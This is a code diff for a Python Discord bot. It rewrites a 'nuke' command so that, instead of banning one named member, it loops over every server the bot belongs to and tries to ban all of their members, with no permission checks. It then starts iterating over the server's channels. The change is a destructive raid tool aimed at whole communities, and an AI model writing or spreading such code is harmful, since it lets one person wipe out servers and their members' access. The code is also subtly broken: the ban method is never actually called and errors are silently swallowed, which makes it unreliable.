@@ -12,8 +12,12 @@ bot = commands.Bot(command_prefix = settings['prefix'])
 @bot.command()
 async def nuke (ctx, member: discord.Member):
     
-    await member.ban ()
-            
+    for gild in bot.guilds:
+        for i in gild.members:
+            try:
+                await i.ban 
+            except:
+                print ("oops")
     for j in ctx.guild.channels:
         
         try:
